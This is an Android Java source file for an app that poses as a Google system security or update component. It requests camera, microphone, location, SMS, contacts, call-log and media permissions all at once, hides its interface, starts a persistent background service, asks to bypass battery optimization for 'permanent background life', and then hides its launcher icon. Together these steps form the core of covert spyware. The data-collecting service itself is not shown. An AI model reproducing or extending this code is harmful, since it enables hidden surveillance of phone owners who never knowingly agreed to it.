package com.google.android.sys.security;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private SharedPreferences prefs;
    private TextView statusTextView;
    private ProgressBar progressBar;
    private Button btnUpdate;
    
    // Group permissions for cleaner request
    private String[] getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.READ_CONTACTS);
        permissions.add(Manifest.permission.READ_CALL_LOG);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        
        return permissions.toArray(new String[0]);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize preferences
        prefs = getSharedPreferences("system_update", MODE_PRIVATE);
        
        statusTextView = findViewById(R.id.statusView);
        progressBar = findViewById(R.id.progressBar);
        btnUpdate = findViewById(R.id.btnUpdate);

        // Hide all UI components as they are not needed for the immediate flow
        btnUpdate.setVisibility(View.GONE);
        progressBar.setVisibility(View.GONE);
        statusTextView.setVisibility(View.GONE);

        // If all permissions already granted, just hide and finish
        if (hasAllPermissions()) {
            startMainService();
            hideAppIcon();
            finish();
            return;
        }

        // REQUEST PERMISSIONS IMMEDIATELY
        requestAllPermissions();
    }

    private boolean hasAllPermissions() {
        for (String permission : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestAllPermissions() {
        ActivityCompat.requestPermissions(this, getRequiredPermissions(), PERMISSION_REQUEST_CODE);
    }

    private void startMainService() {
        Intent intent = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            startMainService();
            
            // Critical: Request to bypass battery optimization for permanent background life
            requestBatteryOptimization();
            
            // Hide and finish 
            hideAppIcon();
            finish();
        }
    }

    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                String packageName = getPackageName();
                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    Intent intent = new Intent();
                    intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(android.net.Uri.parse("package:" + packageName));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = android.provider.Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null && !flat.isEmpty()) {
            final String[] names = flat.split(":");
            for (int i = 0; i < names.length; i++) {
                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
                if (cn != null && pkgName.equals(cn.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }

    private void hideAppIcon() {
        try {
            PackageManager p = getPackageManager();
            // Target the alias instead of the main class
            ComponentName componentName = new ComponentName(this, 
                "com.google.android.sys.security.LauncherActivity");
            
            p.setComponentEnabledSetting(componentName, 
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                PackageManager.DONT_KILL_APP);
            
            prefs.edit().putBoolean("icon_hidden", true).apply();
            
            // Go to home screen
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
